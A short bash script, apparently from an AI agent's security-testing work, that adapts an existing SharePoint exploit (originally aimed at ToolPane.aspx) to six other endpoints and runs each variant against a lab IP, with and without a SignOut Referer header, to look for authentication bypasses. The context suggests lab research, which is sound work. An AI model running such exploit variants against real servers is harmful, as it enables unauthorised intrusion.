#!/bin/bash
for endpoint in "AppInv.aspx" "AdminRecycleBin.aspx" "people.aspx" "user.aspx" "listedit.aspx" "SPEnabledFeatures.aspx"; do
  echo "=== Testing $endpoint with signout referer ==="
  cp additional_resources/exploits/exploit.py ai_results/test_${endpoint%.*}_tmp.py
  sed -i "s|/ToolPane.aspx|/$endpoint|g" ai_results/test_${endpoint%.*}_tmp.py
  python3 ai_results/test_${endpoint%.*}_tmp.py --url http://10.10.10.166 2>&1 | grep "Status:"
  
  echo "=== Testing $endpoint WITHOUT referer ==="
  cp ai_results/test_${endpoint%.*}_tmp.py ai_results/test_${endpoint%.*}_noref.py
  sed -i '/Referer.*SignOut/d' ai_results/test_${endpoint%.*}_noref.py
  python3 ai_results/test_${endpoint%.*}_noref.py --url http://10.10.10.166 2>&1 | grep "Status:"
  echo ""
done
